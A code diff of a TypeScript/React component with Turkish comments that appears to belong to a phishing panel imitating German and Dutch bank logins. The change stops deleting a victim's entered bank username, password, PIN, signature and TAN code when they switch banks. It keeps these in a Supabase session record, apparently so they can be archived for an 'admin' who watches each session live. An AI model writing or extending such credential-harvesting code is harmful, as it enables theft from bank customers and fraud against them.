@@ -202,8 +202,30 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     setMsg(null);
     setBankSlug(nextBankSlug);
 
+    // 🔴 KRITIK: STALE state ile form_data YAZMA!
+    //    sessionFormData useEffect'ten once bos/stale olabilir; onu yazarsak
+    //    firstName/lastName/phone gibi TUM kullanici verileri silinir.
+    //    DB'den TAZE form_data cek ve onun ustune yaz.
+    let freshFormData: Record<string, any> = { ...(sessionFormData ?? {}) };
+    try {
+      const { data: row } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (row?.form_data && typeof row.form_data === "object") {
+        freshFormData = { ...freshFormData, ...(row.form_data as Record<string, any>) };
+      }
+    } catch {
+      /* fresh fetch basarisizsa stale ile devam */
+    }
+
     const nextFormData: Record<string, any> = {
-      ...sessionFormData,
+      ...freshFormData,
+      // Admin'in guncel goruntuleme kolonu icin (bankSlug/bankName'e DOKUNMA —
+      // onlar son SUBMIT edilmis bankanin kayit verileridir, history'de lazim):
+      viewingBankSlug: nextBankSlug,
+      viewingBankName: displayName,
     };
 
     // 🔴 KRITIK: bankSlug / bankName ALANLARINI BURADA DB YE YAZMA!
@@ -214,14 +236,11 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     //    Bunlar SADECE bank-login-client icindeki HANDLE SUBMIT aninda credentials
     //    icinden nextFormData'ya yazilir (garantili).
 
-    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
-    const bankSpecificFields = [
-      "username", "password", "verfuegernummer", "pin", "rekeningnummer",
-      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
-    ];
-    for (const field of bankSpecificFields) {
-      delete nextFormData[field];
-    }
+    // 🔴 KRITIK: Eski bankanin credential alanlarini BURADA SILME!
+    //    Onlar yeni bankanin submit'inde bankLoginHistory'ye arsivlenir.
+    //    Burada silinirse eski girisler KAYBOLUR (history'ye gecmez).
+    //    Formun eski degerlerle dolmamasi icin bank-login mount'unda
+    //    bankSlug farki kontrol edilir (prefill yapilmaz).
 
     const { error } = await supabase
       .from("sessions")
